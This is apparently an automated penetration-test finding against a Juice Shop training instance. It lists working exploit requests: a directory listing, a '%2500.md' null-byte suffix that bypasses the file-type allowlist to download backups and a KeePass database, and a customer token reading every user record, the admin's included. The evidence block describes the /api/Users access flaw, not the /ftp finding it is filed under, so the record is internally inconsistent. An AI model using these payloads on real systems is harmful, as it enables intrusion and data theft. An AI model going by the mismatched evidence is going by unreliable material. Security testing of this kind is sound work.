{"name": "Directory listing and extension-filter bypass expose sensitive files under /ftp", "summary": "Unauthenticated GET /ftp returns a full directory listing, and the server-side allowlist (".md/.pdf only") is bypassed with a %2500.md suffix, letting anyone download 6 of 6 restricted files — including package.json.bak (version/dependency manifest), package-lock.json.bak (750 KB), coupons_2013.md.bak, encrypt.pyc and eastere.gg — while legal.md, acquisitions.md and the KeePass database incident-support.kdbx (3.2 KB) are downloadable directly. 9 of the 11 listed files were retrieved with zero authentication.", "evidence": {"by": "work#3", "poc": "GET http://snare:8000/ftp -> 200, 12479 bytes, <title>listing directory /ftp</title>, links: acquisitions.md, announcement_encrypted.md, coupons_2013.md.bak, eastere.gg, encrypt.pyc, incident-support.kdbx, legal.md, order_4eac-4906dba7b259fde0.pdf, package-lock.json.bak, package.json.bak, suspicious_errors.yml
GET /ftp/package.json.bak -> 403 (Error: Only .md and .pdf files are allowed!)
GET /ftp/package.json.bak%2500.md -> 200, 4263 bytes: {"name": "juice-shop", "version": "6.2.0-SNAPSHOT", ...}
GET /ftp/incident-support.kdbx -> 200, 3246 bytes (KeePass DB)
GET /ftp/package-lock.json.bak%2500.md -> 200, 750353 bytes; /ftp/coupons_2013.md.bak%2500.md -> 200, 131; /ftp/suspicious_errors.yml%2500.md -> 200, 723; /ftp/eastere.gg%2500.md -> 200, 324; /ftp/encrypt.pyc%2500.md -> 200, 573"}, "severity": "high", "vulnclass": "sensitive-file-exposure"}

finding.evidence:
Executed live against http://snare:8000 (proof basis: executed-live). Full raw responses saved at /app/data/tasks/1/i22/resp_GET_api_Users_lowpriv.json, resp_GET_api_Users_1_lowpriv.json, resp_GET_api_Users_2_lowpriv.json (script matrix.py).

1) Obtain a normal customer token (no forgery):
POST /rest/user/login {"email":"i4tester@example.com","password":"Zq7#testPass"}
-> HTTP/1.1 200 OK; JWT payload = {"data":{"id":29,"email":"i4tester@example.com","role":"customer",...},"bid":9,...}

2) Unauthenticated baseline:
GET /api/Users HTTP/1.1
-> HTTP/1.1 401 Unauthorized (234 bytes)

3) Same request with the legit customer JWT:
GET /api/Users HTTP/1.1
Authorization: Bearer <legit customer JWT id=29 role=customer>
-> HTTP/1.1 200 OK, 8015 bytes: {"status":"success","data":[{"id":1,"email":"admin@juice-sh.op","role":"admin","deluxeToken":"","lastLoginIp":"...",...}, ... 28 entries]}

4) Arbitrary object access by the same customer token:
GET /api/Users/1 -> 200 {"status":"success","data":{"id":1,"email":"admin@juice-sh.op","role":"admin","deluxeToken":"","lastLoginIp":"...","isActive":true,...}}
GET /api/Users/2 -> 200 {"status":"success","data":{"id":2,"email":"jim@juice-sh.op","role":"customer",...}}

Measured impact: 28 of 28 user records disclosed to a customer token; 2 of 2 arbitrary non-owned user IDs (1, 2) read successfully; 0 of 1 unauthenticated attempts succeeded (401). Data includes admin e-mail/role, deluxe tokens and last-login IPs.

